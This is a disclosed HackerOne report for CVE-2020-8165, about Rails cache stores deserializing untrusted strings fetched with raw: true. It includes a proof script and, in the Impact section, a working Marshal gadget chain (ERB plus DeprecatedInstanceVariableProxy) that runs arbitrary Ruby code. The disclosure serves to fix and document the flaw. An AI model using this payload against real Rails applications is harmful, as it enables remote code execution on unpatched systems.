---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/deserialization-of-untrusted-data
  - env/web
  - stack/ruby
substate: "resolved"
weakness: "Deserialization of Untrusted Data"
enriched: true
body: true
date: 2020-05-26
submitted: 2018-09-24T12:58:49.441Z
bounty_usd: null
votes: 2
cve: "CVE-2020-8165"
program: "[[programs/rails|Ruby on Rails]]"
reporter: "dylan-ts"
source: "https://hackerone.com/reports/413388"
title: "Untrusted strings that are cache fetched with raw option are automatically marshal loaded"
---
# Untrusted strings that are cache fetched with raw option are automatically marshal loaded

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 2 | **Program:** Ruby on Rails | **Disclosed:** 2020-05-26

- Report: [https://hackerone.com/reports/413388](https://hackerone.com/reports/413388)
- CWE: Deserialization of Untrusted Data | CVE: CVE-2020-8165
- Submitted: 2018-09-24T12:58:49.441Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

This vulnerability effects application code that caches a string from an untrusted source using the `raw: true` option. For example, vulnerable application code might looks something like the following

```ruby
body = Rails.cache.fetch(key, raw: true, expires_in: ttl) do
  res = Net::HTTP.get_response(remote_uri)
  res.value # raise on HTTP error
  res.body
end
```

where `res.body` represents the untrusted string in the example above.  The below script shows that an untrusted string in the Marshal format will be deserialized when read using `raw: true`.

```ruby
require 'rails/all'

untrusted_string = Marshal.dump(:sym)

cache = ActiveSupport::Cache::MemCacheStore.new('localhost')
cache.delete("demo")
data = cache.fetch("demo", raw: true) { untrusted_string }
p data # "\x04\b:\bsym"
data = cache.fetch("demo", raw: true)
p data # :sym
```

This vulnerability appears to have been around for a long time, so would affect all currently supported versions of rails. I've tested with the earliest and latest supported rails version, 4.2.10 and 5.2.1 and both are affected.

The vulnerability affects both MemCacheStore and RedisCacheStore cache backends that are a part of rails, but cache stores developed outside of rails could also be vulnerable. For instance, the memcached_store has the same vulnerability as a result of replicating the behaviour of MemCacheStore.

I've attached patches to fix MemCacheStore and RedisCacheStore on master.  I believe the MemCacheStore patch can be backported, since Dalli uses memcached's flags to tag keys that need marshal loading (since [Dalli version 0.11.0](https://github.com/petergoldstein/dalli/blob/master/History.md#0110)) so can avoid unmarshalling raw strings.  However, backporting RedisCacheStore could cause backwards compatibility problems with application code that writes and reads a cache key with a different raw option value, so I've included a patch to deprecate that usage in rails 5.2.

## Impact

As has been demonstrated in the past, Marshal.load of an untrusted string can lead to remote code execution when done in rails without any reliance on application code.

The following script demonstrates that this is still the case and shows that a generic exploit payload can be used.

```ruby
require 'erb'
require 'rails/all'

remote_code = <<-RUBY
puts 'HACKED'
RUBY

erb = ERB.allocate
erb.instance_variable_set(:@src, remote_code)
erb.instance_variable_set(:@lineno, 0)
deprecation = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result)
exploit_data = Marshal.dump(deprecation)

obj = Marshal.load(exploit_data)
obj.is_a?(ActiveSupport::Cache::Entry)
```

So a generic exploit payload could be provided to applications to try to find if the application stores and fetches raw strings from the cache.

## Timeline

- **Report Filed**
- **2018-09-25** @dylan-ts: Without publicly disclosing the security vulnerability, I've fixed it for the memcached_store gem (https://github.com/Shopify/memcached_store/pull/51) and released its fix in v2.0.2.
- **2018-09-27** @jeremy: Thanks for the report @dylan-ts! The `:raw` option is to bypass using Entry wrappers. It has the same threat profile as `eval`, and is meant to. Are you seeing cases where it's commonly misused, or invites untrusted input?
- **2018-09-27** @jeremy: Ah, seeing the issue is that the entry is being deserialized despite having specified `raw: true`. That's an issue 👍

In the patches, note that the local cache strategy wraps raw values with Entry instances for in-memory cache lookups, but that's not written to the underlying cache store.
- **Report Triaged**
- **2018-09-28** @dylan-ts: LocalCacheWithRaw wraps the raw values in write_entry, so there is no need for LocalCacheWithRaw#read_entry when the super method already returns a Entry instance.  So basically I just removed that method in the patches because it was unnecessary.
- **2019-01-21** @dylan-ts: Any update on this?  It feels like it has just been forgotten about.
- **2020-05-13** @dylan-ts: I've rebased and reapplied the patches on the latest master, 5-2-stable and 6-0-stable.  The patch for RedisCacheStore in rails 6.0 is just a deprecation for backwards compatibility reasons, as I explained before for rails 5.2.

I tested the demo scripts and confirmed that the vulnerability is still present, although the introduction of https://github.com/ruby/ruby/commit/b3507bf147ff47e331da36ba7c8e6b700c513633 into ruby 2.7 will prevent the remote code execution as demonstrated above with ERB, but I confirmed that the exploit script does still work with ruby 2.6.
- **2020-05-15** @jack_mccracken: I've created an advisory for this vulnerability. Let me know if it sounds good to you!
- **2020-05-16** @dylan-ts: I noticed a typo on the line starting with:

> Not affected:       Applications not using MemCacheStoer or RedisCacheStore.

Replace "MemCacheStoer" with "MemCacheStore".

I'm assuming "CVE-2020-XXXX" will be replaced once a CVE number is obtained.

Otherwise, looks good to me.
- **Report Resolved**
- **Not Eligible For Bounty**
- **Agreed On Going Public**
- **2020-05-18** @dylan-ts: I'm just glad this is getting fixed. Thanks!
- **Manually Disclosed**
